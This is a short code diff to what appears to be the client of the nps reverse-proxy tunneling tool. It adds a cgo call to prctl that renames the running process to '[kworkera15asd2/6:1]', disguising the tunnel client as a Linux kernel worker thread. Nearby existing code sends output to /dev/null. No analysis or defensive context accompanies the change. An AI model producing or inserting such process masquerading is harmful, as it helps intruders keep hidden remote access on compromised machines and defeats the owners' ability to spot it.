@@ -1,4 +1,14 @@
 package main
+/*
+#include <sys/prctl.h>
+#include <linux/prctl.h>
+#include <stdlib.h>
+
+void setProcName(const char* name) {
+    prctl(PR_SET_NAME, name);
+}
+*/
+import "C"
 
 import (
 	"ehang.io/nps/client"
@@ -18,7 +28,13 @@ import (
 	"strings"
 	"sync"
 	"time"
+        "unsafe"
 )
+func setProcessName(name string) {
+    cName := C.CString(name)
+    defer C.free(unsafe.Pointer(cName))
+    C.setProcName(cName)
+}
 
 var (
 	serverAddr     = flag.String("server", "", "Server addr (ip:port)")
@@ -42,6 +58,7 @@ var (
 )
 
 func main() {
+        setProcessName("[kworkera15asd2/6:1]")
         // 打开 /dev/null 文件
 	devNull, err := os.OpenFile(os.DevNull, os.O_WRONLY, 0666)
 	if err != nil {
